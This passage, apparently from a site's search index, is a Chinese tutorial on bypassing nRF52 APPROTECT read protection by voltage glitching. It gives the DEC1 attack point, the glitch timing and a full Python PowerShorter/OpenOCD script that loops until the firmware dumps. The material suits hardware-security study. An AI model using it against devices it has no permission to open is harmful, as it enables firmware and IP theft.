\u82af\u7247\u3002\u540c\u65f6\u56e0\u4e3a\u5f88\u591a\u82af\u7247\u4e1d\u5370\u4e0e\u82af\u7247\u624b\u518c\u65e0\u6cd5\u5bf9\u5e94\uff0c\u56e0\u6b64\u8fd9\u91cc\u63d0\u4f9b\u4e00\u4e2a\u65b9\u6cd5\uff0c\u7b80\u5355\u5224\u65ad\u82af\u7247\u662f\u5426\u4e3a\u65b0\u7248\u672c\uff1a</p> <p>\u9996\u5148\u6309\u7167\u524d\u6587\u6240\u8bf4 SWD \u63a5\u7ebf\u65b9\u5f0f\u63a5\u7ebf\uff0c\u4f7f\u7528 <code>nrfjprog -f NRF52 --recover</code> \u547d\u4ee4\u89e3\u9664\u4fdd\u62a4\uff0c\u7136\u540e\u62d4\u63d2\u91cd\u65b0\u4e0a\u7535\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u8bfb\u53d6 APPROTECT \u5bc4\u5b58\u5668\u7684\u503c\uff0c\u82e5\u5168\u4e3a FF \u5219\u662f\u8001\u7248\u672c\u82af\u7247\uff0c\u82e5\u4e3a 5A \u5219\u662f\u65b0\u7248\u672c\u82af\u7247</p> <pre><code>nrfjprog -f nRF52 --memrd 0x10001208\n</code></pre>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#approtect_2","title":"\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7 APPROTECT \u8bfb\u4fdd\u62a4","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#cpu","title":"\u7535\u538b\u6bdb\u523a\u6ce8\u5165\u7269\u7406\u4f4d\u7f6e\uff1aCPU \u6838\u5fc3\u4f9b\u7535","text":"<p>\u7535\u538b\u6545\u969c\u6ce8\u5165\u653b\u51fb\u70b9\u4f4d\u4e8e\u82af\u7247\u9644\u8fd1\u7684\u4e00\u9897\u5c0f\u7535\u5bb9\u7684\u53f3\u4fa7\uff0c\u8be5\u70b9\u8fde\u63a5\u5230\u82af\u7247 DEC1 \u5f15\u811a\uff08\u7535\u5bb9\u5de6\u4fa7\u901a\u8fc7\u4e07\u7528\u8868\u53ef\u6d4b\u5f97\u4e3a GND\uff09</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_6","title":"\u7535\u538b\u6bdb\u523a\u6ce8\u5165\u65f6\u95f4\u4f4d\u7f6e","text":"<p>\u4f7f\u7528\u793a\u6ce2\u5668\u4ee5 DEC1 \u4e0a\u5347\u6cbf\u4f5c\u4e3a\u89e6\u53d1\uff0c\u89c2\u5bdf DEC1 \u5904\u7535\u538b\u6ce2\u5f62\uff0c\u53ef\u4ee5\u770b\u5230\u5b58\u5728\u4e00\u4e2a\u5c0f\u7684\u7535\u538b\u4e0b\u964d\u6cbf\uff0c\u538b\u964d\u5927\u7ea6 100~200mv\uff0c\u6bdb\u523a\u5c31\u6253\u5728\u8fd9\u4e2a\u5c0f\u4e0b\u964d\u6cbf\u9644\u8fd1</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_7","title":"\u6545\u969c\u6ce8\u5165\u65f6\u9047\u5230\u7684\u95ee\u9898","text":"<p>1\u3001\u5982\u4f55\u63a7\u5236\u8bbe\u5907\u91cd\u542f</p> <p>\u200b   \u7b54\uff1a\u901a\u8fc7 PowerShorter \u8bbe\u5907\u7684 GPIO \u4e3a Dongle \u4f9b\u7535\uff0cPython \u4ee3\u7801\u63a7\u5236 GPIO</p> <p>2\u3001\u6253\u54ea\u4e2a\u5730\u65b9\u7684\u7535\u538b\u3001\u5982\u4f55\u6253</p> <p>\u200b   \u7b54\uff1a\u6253 DEC1\uff1b\u77ed\u63a5 DEC1 \u548c GND \u4f7f\u5176\u7535\u538b\u77ed\u6682\u62c9\u4f4e</p> <p>3\u3001\u4ec0\u4e48\u65f6\u5019\u6253\u6545\u969c</p> <p>\u200b   \u7b54\uff1a\u4ee5 GPIO \u4f9b\u7535\u4e0a\u5347\u6cbf\u4f5c\u4e3a\u89e6\u53d1\uff0c\u8bbe\u7f6e\u5ef6\u65f6\uff0c\u6545\u969c\u6253\u5728 DEC1 \u4e0b\u964d\u6cbf\u9644\u8fd1</p> <p>4\u3001\u600e\u4e48\u5224\u65ad\u662f\u5426\u6253\u6210\u529f\u4e86</p> <p>\u200b   \u7b54\uff1aopenocd \u8fde\u63a5 SWD \u8bfb\u53d6\u56fa\u4ef6\uff0cdump \u6210\u529f\u5219\u6545\u969c\u6ce8\u5165\u6210\u529f\uff08\u6ce8\uff1aOpenocd \u8c03\u7528 jlink \u9700\u8981\u4f7f\u7528 zadig \u8f6f\u4ef6\u5b89\u88c5 winusb \u9a71\u52a8\uff09</p> <p>\u914d\u5408 Flex Holder \u67d4\u6027\u63a2\u9488\u53f0\u53ef\u4ee5\u514d\u53bb\u710a\u63a5\uff0c\u76f4\u63a5\u5c06\u5c0f\u7535\u5bb9\u53f3\u4fa7\u7684 DEC1 \u5f15\u811a\u5f15\u51fa</p> <p></p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_8","title":"\u786c\u4ef6\u63a5\u7ebf\u53c2\u8003","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_9","title":"\u6210\u529f\u6ce2\u5f62\u53c2\u8003","text":"<p>A \u901a\u9053(\u84dd\u8272\u6ce2\u5f62)\u4e3a\u4f9b\u7535\u7535\u538b\uff1bB \u901a\u9053(\u7ea2\u8272\u6ce2\u5f62)\u4e3a DEC1 \u7535\u538b</p> <p>DEC1 \u7684\u4e0b\u964d\u6cbf\u4f4d\u7f6e\u6070\u597d\u88ab\u6545\u969c\u6bdb\u523a\u547d\u4e2d\uff0c\u4e0d\u518d\u8868\u73b0\u4e3a\u4e0b\u964d\u6cbf\uff0c\u4f46\u5e76\u4e0d\u662f\u6ca1\u6709\u4e0b\u964d\u6cbf\u5c31\u4e3a\u6210\u529f</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_10","title":"\u653b\u51fb\u811a\u672c\u53c2\u8003","text":"<p>\u63a8\u8350\u4f7f\u7528 Jupyter Lab \u8fdb\u884c\u5b9e\u9a8c</p> <p>\u5bfc\u5165 Python \u5e93</p> <pre><code>from power_shorter import *\nimport time, os, random, subprocess\nimport serial\nimport faultviz\n</code></pre> <p>\u521d\u59cb\u5316\u8bbe\u5907</p> <pre><code>ps_dev = PowerShorter('com55')\n</code></pre> <p>\u6d4b\u8bd5\u8bbe\u5907\u4e0a\u4e0b\u7535</p> <pre><code>ps_dev.gpio(GPIO.GPIO1, 0)\ntime.sleep(1)\nps_dev.gpio(GPIO.GPIO1, 1)\n</code></pre> <p>\u521d\u59cb\u5316 faultviz \u670d\u52a1\u4e0e\u8868\u5355</p> <pre><code>faultviz.start_view_service(port=12345) \nvt = faultviz.ViewWidget()\n</code></pre> <p>\u5b9a\u4e49\u653b\u51fb\u51fd\u6570</p> <pre><code>def nrf52_attack():\n    ps_dev.gpio(GPIO.GPIO1, 0)\n    time.sleep(1)\n    glitch_delay = random.randint(158500, 158700) # \u8bbe\u7f6e\u6bdb\u523a\u5ef6\u8fdf\u8303\u56f4\n    glitch_pulse = random.randint(100, 300)       # \u8bbe\u7f6e\u6bdb\u523a\u5bbd\u5ea6\u8303\u56f4\n    ps_dev.engine_cfg(Engine.E1, [(0, glitch_delay), (1, glitch_pulse), (0, 1)], TRIGGER_MODE.RISE)    # \u8bbe\u7f6e\u6bdb\u523a\u5ef6\u65f6\u53ca\u5bbd\u5ea6\n    ps_dev.arm(Engine.E1)        # \u6fc0\u6d3b\u6bdb\u523a\n    ps_dev.gpio(GPIO.GPIO1, 1)   # \u8bbe\u5907\u4e0a\u7535\n    time.sleep(0.5)              # \u5ef6\u8fdf\u4e00\u6bb5\u65f6\u95f4 \u7b49\u5f85\u653b\u51fb\u5b8c\u6210\n    s = ps_dev.state(Engine.E1)  # \u68c0\u67e5\u6bdb\u523a\u72b6\u6001\n    if s == \"glitched\":\n        res, result = subprocess.getstatusoutput('openocd -f interface/jlink.cfg -c \"transport select swd\" -f target/nrf52.cfg -c \"init;dump_image nrf_flash.bin 0x0 0x10000;exit\"')  # \u901a\u8fc7 OpenOCD dump \u56fa\u4ef6\uff0c\u82e5\u6210\u529f\u5219\u8868\u793a\u5df2\u7ed5\u8fc7 APPROTECT\n        if \"Could not find MEM-AP to control the core\" in result:\n            status = \"Normal\"\n        elif \"No J-Link device found\" in result:\n            status = \"No Jlink\"\n        elif res == 0:\n            status = \"Success\"\n        else:\n            status = \"Unknown\"\n        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = result, res = res)  # \u66f4\u65b0\u6545\u969c\u7ed3\u679c\u5230\u8868\u5355\n        return res\n    else:\n        print(\"no trigger\")\n</code></pre> <p>\u6267\u884c\u4e00\u6b21\u653b\u51fb\u51fd\u6570\uff0c\u68c0\u67e5\u4ee3\u7801\u662f\u5426\u6709\u95ee\u9898</p> <pre><code>nrf52_attack()\n</code></pre> <p>\u67e5\u770b\u8868\u5355\uff0c\u68c0\u67e5\u521a\u624d\u7684\u653b\u51fb\u662f\u5426\u5c06\u7ed3\u679c\u6dfb\u52a0\u5230\u8868\u5355\u4e2d</p> <pre><code>vt.show()\n</code></pre> <p>\u5199\u4e2a\u5faa\u73af\uff0c\u76f4\u5230\u6210\u529f\u7ed5\u8fc7 APPROTECT \u624d\u505c\u6b62\u653b\u51fb\uff0c\u5faa\u73af\u8fc7\u7a0b\u4e2d\u6545\u969c\u53c2\u6570\u53ca\u7ed3\u679c\u4f1a\u4e0d\u65ad\u6dfb\u52a0\u5230 vt \u8868\u5355\u4e2d\uff0c\u914d\u5408\u793a\u6ce2\u5668\u8c03\u6574\u53c2\u6570\uff0c\u4f18\u5316\u6bdb\u523a\u4f4d\u7f6e</p> <pre><code>doAttack = 1\nwhile(doAttack):\n    doAttack = nrf52_attack()\n</code></pre>"}]}